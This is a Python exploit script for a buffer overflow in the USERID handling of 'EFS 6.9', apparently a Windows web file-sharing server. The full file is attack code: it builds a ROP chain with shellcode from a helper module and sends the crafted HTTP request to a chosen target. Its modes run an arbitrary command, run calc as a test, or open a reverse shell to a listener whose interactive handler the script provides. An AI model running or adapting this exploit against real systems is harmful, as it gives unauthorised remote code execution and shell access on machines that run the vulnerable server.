#!/usr/bin/env python3
from __future__ import annotations

import argparse
import socket
import select
import sys
import threading
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))

from request_builder import (
    build_http_request,
    build_rop_chain,
    build_winexec_stager,
    build_callback_bytes,
)


def send_stimulus(target: str, port: int, request: bytes, timeout: float) -> None:
    with socket.create_connection((target, port), timeout=timeout) as sk:
        sk.sendall(request)


def dry_run(rop: bytes, http: bytes, output: Path) -> None:
    output.write_bytes(http)
    print(f"[+] Request written to {output}  ({len(http)} bytes)")
    print(f"    Payload (ROP + shellcode): {len(rop)} bytes")


def handle_callback(sock: socket.socket) -> None:
    sock.settimeout(10)
    try:
        banner = sock.recv(4096)
        if banner:
            sys.stdout.buffer.write(banner)
            sys.stdout.buffer.flush()
    except socket.timeout:
        pass
    sock.settimeout(None)
    poll = select.poll()
    poll.register(sys.stdin, select.POLLIN)
    poll.register(sock, select.POLLIN)
    while True:
        for fd, _event in poll.poll():
            if fd == sys.stdin.fileno():
                data = sys.stdin.buffer.read(4096)
                if not data:
                    return
                sock.sendall(data)
            elif fd == sock.fileno():
                data = sock.recv(4096)
                if not data:
                    return
                sys.stdout.buffer.write(data)
                sys.stdout.buffer.flush()


def main() -> int:
    p = argparse.ArgumentParser(description="Trigger EFS 6.9 USERID overflow")
    p.add_argument("--target", required=True)
    p.add_argument("--port", type=int, default=80, help="TCP connect port (hostfwd, e.g. 18080)")
    p.add_argument("--service-port", type=int, default=80, help="Guest HTTP port in Host header")
    p.add_argument("--mode", choices=["callback", "exec", "dry-run"], required=True)
    p.add_argument("--lhost", default="")
    p.add_argument("--lport", type=int, default=4444)
    p.add_argument("--cmd", default="")
    p.add_argument("--output", type=Path, default=Path("efs69-response.bin"))
    p.add_argument("--timeout", type=float, default=10.0)
    args = p.parse_args()

    if args.mode == "callback":
        if not args.lhost:
            p.error("--lhost required in callback mode")
        shellcode = build_callback_bytes(args.lhost, args.lport)
    elif args.mode == "exec":
        if not args.cmd:
            p.error("--cmd required in exec mode")
        shellcode = build_winexec_stager(args.cmd)
    else:
        shellcode = build_winexec_stager("calc")

    rop = build_rop_chain(shellcode)
    req = build_http_request(args.target, args.port, rop, host_port=args.service_port)

    if args.mode == "dry-run":
        dry_run(rop, req, args.output)
        return 0

    if args.mode == "callback":
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind(("0.0.0.0", args.lport))
        listener.listen(1)
        print(f"[*] Listening on 0.0.0.0:{args.lport}")

        send_stimulus(args.target, args.port, req, args.timeout)
        print(f"[*] Stimulus sent to {args.target}:{args.port}")

        conn, addr = listener.accept()
        print(f"[+] Inbound connection from {addr[0]}:{addr[1]}")
        listener.close()
        handle_callback(conn)
        return 0

    send_stimulus(args.target, args.port, req, args.timeout)
    print(f"[+] Exec stager sent to {args.target}:{args.port}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
